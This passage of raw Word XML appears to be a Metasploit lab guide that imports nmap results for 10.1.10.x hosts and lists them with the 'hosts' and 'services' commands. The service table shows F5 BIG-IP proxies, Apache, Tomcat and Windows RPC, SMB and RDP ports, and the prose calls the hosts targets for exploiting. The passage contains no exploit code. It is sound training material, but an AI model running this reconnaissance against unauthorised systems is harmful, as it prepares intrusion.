      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.51</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205AF66E" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.55</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAC96CD" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.59</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64222331" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CACFE26" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.101</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639EA822" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.102</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A50042" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.115</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D07D0FF" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE9AB7E" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0264C6FC" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.131</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F326C96" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.132</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7CBBCA" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.195</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583D2A8B" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.240</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236C905A" w14:textId="3D960192" w:rsidR="002550AF" w:rsidRPr="00FB4F2F" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Successfully imported /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/nmap.xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D06DAB" w14:textId="7F3CB6FC" w:rsidR="00C72990" w:rsidRDefault="00C72990">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now you can view the hosts where were located by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5744EF03" w14:textId="238A9DD8" w:rsidR="00C72990" w:rsidRDefault="00C72990" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>hosts -c</w:t>
      </w:r>
      <w:r w:rsidRPr="00C72990">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>address,name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>,os_name,purpose</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="17D62117" w14:textId="6D8EF20C" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE8B511" w14:textId="13CA0471" w:rsidR="002550AF" w:rsidRPr="002550AF" w:rsidRDefault="002550AF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The hosts command will show the list of targets that are available for exploiting.  The XML file we have imported will also show more than just the IP address.  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>is able to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> determine the kind of host that was scanned.  Here you can see that it has seen the VIPs as ‘TMOS’ and knows that they’re an F5 virtual server based on the signature of the connection.  Where possible, it has done a reverse DNS lookup and you can see what has been found in the local hosts file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A66631" w14:textId="51AD7AE7" w:rsidR="00312E6B" w:rsidRDefault="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>To see what services are available to connect to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0750D7C6" w14:textId="3367D14B" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D2FA9E" w14:textId="3036789F" w:rsidR="00904E7B" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BE3425" w14:textId="5AB476E4" w:rsidR="002550AF" w:rsidRPr="00FB4F2F" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is where things get very interesting… </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> has determined the ports and accessible items for each of the hosts.  Now it’s possible to do some investigation and access/attach to the ports of interest.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633513EE" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064A8707" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742ACACB" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28B2B0E1" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">host         port   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>proto  name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">           state  info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A386733" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>----         ----   -----  ----           -----  ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DC09F7" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.14   80     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http           open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6476F490" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.35   80     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42911C1E" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.35   443    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">/http       open   Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.21 OpenSSL/1.0.1f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F082A3" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.50   80     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD09BF4" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.50   443    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/http       open   Apache Tomcat/Coyote JSP engine 1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FBB954" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.51   80     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4901B59D" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.51   443    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/https      open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A129AA" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.55   80     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC85298" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.55   443    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">/http       open   Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.21 OpenSSL/1.0.1f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66158A60" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.59   3389   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>wbt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>server  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="636A7A23" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.90   135    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>msrpc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">          open   Microsoft Windows RPC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC74D3" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.90   139    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>netbios-ssn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    open   Microsoft Windows 98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>netbios-ssn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="527A698A" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.90   445    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>microsoft</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-ds   open   primary domain: WORKGROUP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2FB763" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.90   3389   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>wbt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>server  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   Microsoft Terminal Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9B2C26"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49152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5DF9B02E"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49153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4EE8B0A6"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49154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4FCDA546"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49155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1F4A4786"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49156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7FA69207" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">10.1.10.90   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">49157  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>msrpc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">          open   Microsoft Windows RPC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343D1925" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.101  81</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    http-proxy     open   F5 BIG-IP load balancer http proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FA6AFF" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.101  443</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/https      open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE78835" w14:textId="77777777" w:rsidR="002550AF" w:rsidRPr="00526315" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>10.1.10.102  80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">     </w:t>
      </w:r>
